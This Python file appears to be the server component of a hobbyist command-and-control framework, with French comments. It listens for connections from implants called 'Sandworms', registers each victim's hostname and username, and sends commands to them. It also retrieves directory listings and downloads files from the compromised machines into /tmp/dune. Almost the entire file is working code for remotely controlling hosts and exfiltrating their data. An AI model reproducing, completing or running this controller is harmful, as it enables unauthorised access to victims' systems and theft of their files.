import threading
import socket
import logger
import os

log = logger.Logger(verbosity="debug")


class CustomTCPServer:

    def __init__(self, IP:str, PORT:int, index:int, on_new_tcp_sandworm, threads:int = 5):
        """
        Initializing the TCPServer class

        :param IP : Interface on which to listen
        :param PORT : port number on which to listen
        :param threads : number of concurrents clients accepted
        """

        self.IP = IP
        self.PORT = PORT
        self.threads = threads
        self.index = index
        
        self.server = None # will be initialized in listen()
        self.running = False # Flag to control server shutdown
        
        self.counter = 0 # Keep track of clients
        self.clients = {} # Dictionary to store connceted Sandworms (clients)

        self.on_new_tcp_sandworm = on_new_tcp_sandworm # Callback function to signal new client

        log.debug(f"TCPServer initialized for {IP}:{PORT} with capacity {threads}")


    def listen(self):
        self.running = True
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) # Allows reusing the same port quickly
        self.server.bind((self.IP, self.PORT))
        self.server.listen(self.threads)
        
        log.info(f"TCPServer started listening for {self.IP}:{self.PORT} with capacity {self.threads}")

        try:

            while self.running:
                client_socket, address = self.server.accept()
                log.info(f"Accepted connection from {address[0]}:{address[1]}")


                # Recoit les données de départ du client
                data = client_socket.recv(1024).decode().strip()

                if not data:
                    log.warning(f"Empty data received from {address[0]}")
                    client_socket.close()
                    continue

                try:
                    hostname, username = data.split(',')
                
                except ValueError:
                    log.error(f"Malformed data received: {data}")
                    client_socket.close()
                    continue

                # Adjust class variables
                index = self.counter
                self.counter += 1

                # Store the client
                self.clients[index] = {
                    "socket": client_socket,
                    "hostname": hostname,
                    "username": username
                }

                # Notifying ArakisCLI about new connection
                self.on_new_tcp_sandworm(index, hostname, username, client_socket, self.index)

                log.info(f"Sandworm [{index}] registered -> Host: {hostname}, User: {username}")
                
                # Send acknowledgment
                print("Sending ACK..")
                client_socket.send(b'ACK')


                #client_handler = threading.Thread(target=self.handle_client, args=(client_socket,index))
                #client_handler.daemon = True # Ensures threads exit when main program ends
                #client_handler.start()

        except KeyboardInterrupt:
            log.warning("Server shutting down due to keyboard interrupt.")
        finally:
            self.stop()


    # TODO : J'ai l'impression que cette fonctione ne sert plus à grand chose
    # Peut-être regarder pour la changer en un "prober" à la place
    def handle_client(self, client_socket, index):
        """
        Handles a single client connection.

        :param client_socket: The client's socket object
        :param address: The client's (IP, Port) tuple
        """       
        
        try:
            while True:
                data = client_socket.recv(1024)

                if not data:
                    log.info(f"No data received from client : {client_socket}")
                    break

                data = data.decode().strip()
                log.debug(f"Data from Sandworm [{index}] : {data}")

                
                if data == "exit\n":
                    log.warning(f"Received 'exit' command, closing connection")
                    break
                else:
                    print("Sending ACK in handle client")
                    client_socket.send(b'ACK')
        
        except Exception as e:
            log.error(f"Error handling client {index} : {e}")
        
        finally:
            self.counter-=1
            log.info(f"Closing connection with client {index}")
            client_socket.close()


    def get_listing(self, client_socket):
        """
        Send back client's directory listing
        TODO : add path option
        """
        client_socket.send("LIST".encode())

        response_data = ""
        while True:
            chunk = client_socket.recv(4096).decode()
            if "END_FILES" in chunk:
                response_data += chunk.replace("END_FILES", "")
                break
            response_data += chunk

        return response_data[6:]
    

    def get_remote_file_info(self, client_socket, file_path):
        """
        Ask the client_socket for the file infos of <file_path>
        The filename along with the filesize is then returned to the download_remote_file function
        """
        try:
            client_socket.send(f"FILE_INFO {file_path}".encode()+b"\n")

            response_data = client_socket.recv(4096).decode()

            return response_data

        except Exception as e:
            log.error(f"Error getting remote file ({file_path}) information : {e}")
            return


    def download_remote_file(self, client_socket, file_path):
        """
        Download the specified file from the remote system

        TODO : Terminer la fonction de download : sandworm, arakis, ici et client
        """

        """
        try:
            data = self.get_remote_file_info(client_socket, file_path)
            filename, filesize = data.split()


        except Exception as e:
            log.error(f"Error getting remote file information : {e}")
            return False
        """
        try:
            
            client_socket.send(f"DOWNLOAD {file_path}".encode()+b"\n")

            # On recoit FILE_START, FILENAME, FILESIZE du client
            file_info = client_socket.recv(4096).decode()
            print(file_info)
            _, filename, filesize = file_info.split()

            client_socket.send("ACK".encode())

            # os.path.basename("/home/user/test.txt") -> test.txt
            
            # Prevent directory traversal
            # En faisant basename, on écrit le fichier test.txt au lieu de /home/user/test.txt
            # Donc on a plus de contrôle et pas de risque de directory traversal
            filename = os.path.basename(filename) 
            filesize = int(filesize)

            # TODO : IMPORTANT de changer ca pour prendre en compte windows
            if not os.path.exists("/tmp/dune"):
                os.makedirs("/tmp/dune")

            local_filename = "/tmp/dune/" + filename
            

            log.info(f"Receiving file: {filename} ({filesize} bytes) and saving it as : {local_filename}")

            with open(local_filename, "wb") as file:
                received = 0
                while received < filesize:
                    chunk = client_socket.recv(4096)
                    if b"FILE_END" in chunk: # Je me demande si un fichier qui contient FILE_END poserait pas un problème ?
                        chunk = chunk.replace(b"FILE_END", b"")
                        file.write(chunk)
                        break
                    file.write(chunk)
                    received += len(chunk)
                    log.info(f"Received {received}/{filesize} bytes..")

            log.info(f"File '{filename}' received successfully.")

        except Exception as e:
            log.error(f"Error receiving file: {e}")
            return False
        
        return True



    def close_socket(self, client_socket):
        """
        Close client's socket client_socket
        TODO : Valider si la fonction handle_client qui roule dans le thread pose problème
        """
        log.warning("Closing client socket..")
        client_socket.close()
        log.warning("Client socket closed")


    def send_to_client(self, index, command):
        """
        Send a command to a specific sandworm
        """
        if index in self.clients:
            self.clients[index]["socket"].send(command.encode() + b"\n")
        else:
            print(f"Sandworm [{index}] does not exist")

    
    def stop(self):
        """
        Stops the server gracefully.
        """
        log.warning("Stopping TCP server...")
        self.running = False
        if self.server:
            self.server.close()



